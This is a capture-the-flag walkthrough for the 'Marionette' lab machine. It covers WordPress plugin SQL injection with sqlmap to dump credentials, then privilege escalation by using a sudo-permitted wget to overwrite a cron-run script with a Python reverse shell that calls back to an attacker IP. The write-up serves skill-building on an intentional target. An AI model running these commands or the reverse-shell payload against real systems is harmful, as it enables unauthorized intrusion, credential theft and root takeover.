# Introduction
Marionette is an easy boot2root CTF machine that mixes fantasy story telling, web application exploitation and a creative privilege scalation vector to hone your skills

Use netdiscover to identify the target machine's IP address on your network:
```bash
sudo netdiscover -r 10.10.10.0/24
```

Replace `10.10.10.0/24` with your network range (e.g., 192.168.0.1/24). This will scan the local network and display all active hosts with their IP addresses and MAC addresses.


# Enumeration

Start by running an nmap scan to identify open ports:
```bash
nmap -T4 -sV <target>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.63 ((Ubuntu))
MAC Address: 08:00:27:C0:EB:11 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Results show ports 22 (SSH) and 80 (HTTP) are open. Equipped with Wappalyzer and Basic Comprehension, it is evident that the target web application is running off a popular CMS called Wordpress.

Lets read all the blog posts and check for user comments, one of the user comments points to a hidden page, where we identify a custom plugin called Perfect survey

Use wpscan to list and verify the presence of above plugin:
```bash
wpscan --url http://<target> --enumerate ap

[+] perfect-survey
 | Location: http://10.10.10.15/wp-content/plugins/perfect-survey/
 | Latest Version: 1.5.1 (up to date)
 | Last Updated: 2021-06-11T12:09:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 | Confirmed By: Urls In 404 Page (Passive Detection)
 |
 | Version: 1.5.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.10.10.15/wp-content/plugins/perfect-survey/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.10.10.15/wp-content/plugins/perfect-survey/readme.txt
```

We have identified that the target is running Wordpress Plugin Perfect Survey 1.5.1 which is vulnerable to Unauthenticated SQLi ([CVE-2021-24762](https://www.exploit-db.com/exploits/50766))

# Foothold

Examine the exploit for the vulnerable plugin from ExploitDB, this endpoint is vulnerable to SQLi:
```bash
wp-admin/admin-ajax.php?action=get_question&question_id=1
```

> Although we can use the exploitdb's PoC; it's better to run sqlmap directly

Use sqlmap to dump the WordPress database:
```bash
sqlmap 'http://marionette.ip/wp-admin/admin-ajax.php?action=get_question&question_id=1' --dbs
```

> It's now the time to enumerate further, since this is a writeup I'll jump straight to the solution
```bash
sqlmap 'http://marionette.ip/wp-admin/admin-ajax.php?action=get_question&question_id=1' -D workshop -T user_backups --dump
```
> crack the hashes using john/hashcat or [Crackstation](crackstation.net)

Obtain credentials for the user `pinocchio` and use them to gain a shell on the target system.


# Privilege Escalation
As always, we start our post exploitation enumeration by checking for unusual files, folders and permissions all over the box, we particularly come accross a python script in `/opt/workshop`.

`ls -la /opt/workshop` will reveal that the script is being written every 5 minutes, perhaps it could also have been executing* in between the intervals?

Before inspecting the file, let's go back to one of the important enumeration commands
```bash
sudo -l

User pinocchio may run the following commands on marionette:
(bluefairy) NOPASSWD: /usr/bin/wget
```
> Interestingly, this makes more sense if you read the note left over by the blue fairy inside pinocchio's home

Let us now modify `/opt/workshop/workshop_utils.py` and gain a reverse shell; but unfortunately the file is only writable by bluefairy!

Upon reading the man page of wget; we get to know that we can overwrite a file using the -O command!

Open up two new tabs in your attacker machine, prepare a malicious file `workshop_utils.py` with the following code


```python
import socket,os,pty

def check_inventory():
    s=socket.socket()
    s.connect(("10.10.10.8", 4444))
    [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
    pty.spawn("/bin/sh")
```
Replace `10.10.10.8` with your actual attacker's ip address, now save this file, start a listener with `nc -nlvp 4444`

On a new tab, let's serve this file via python:
```bash
python3 -m http.server 8000
```

On your ssh session as pinocchio@marionette; run the following commands to replace the workshop utility as* the bluefairy

```bash
cd /opt/workshop
sudo -u bluefairy wget http://10.10.10.8:8000/workshop_utils.py -O workshop_utils.py
```

> make sure the file has been successfully overwritten, then wait <2 minutes to receive a reverse connection back, if everything goes well, you'll receive a root shell on your netcat listener tab; 

> If more than 2 minutes have passed and you still haven't received the connection, verify that `workshop_utils.py` has been successfully overwritten. Recall that during enumeration, we observed the file is automatically rolled back to its original state every 5 minutes (a cleanup task performed by the box). 

> Re-run the malicious wget command to overwrite the file again. This time, your exploit should execute within 2 minutes, before the scheduled cleanup task runs.